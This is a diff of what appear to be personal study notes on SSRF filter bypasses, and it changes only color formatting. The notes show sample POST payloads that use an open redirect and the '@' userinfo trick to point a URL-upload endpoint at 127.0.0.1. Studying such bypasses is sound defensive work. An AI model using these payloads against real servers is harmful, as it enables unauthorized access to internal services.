@@ -32,7 +32,7 @@ In the following request, we utilize an open redirect on pics.example.com to red
 `(POST request body) user_id=1234&url=https://pics.example.com/123?redirect=127.0.0.1`
 ### allow list based on regex  
 `POST /upload_profile_from_url Host: public.example.com
-(POST request body) user_id=1234&url=<span style="color:rgb(146, 208, 80)">https://pics.example.com@127.0.0.1</span>`
+(POST request body) user_id=1234&url=<span style="color:rgb(0, 112, 192)"><span style="color:rgb(146, 208, 80)">https://pics.example.com@127.0.0.1</span></span>`
 you can use <span style="color:rgb(146, 208, 80)">@</span> to tell the server what's after the @ <span style="color:rgb(146, 208, 80)">is the domain I'm talking </span> 
 
 **or u can use** 
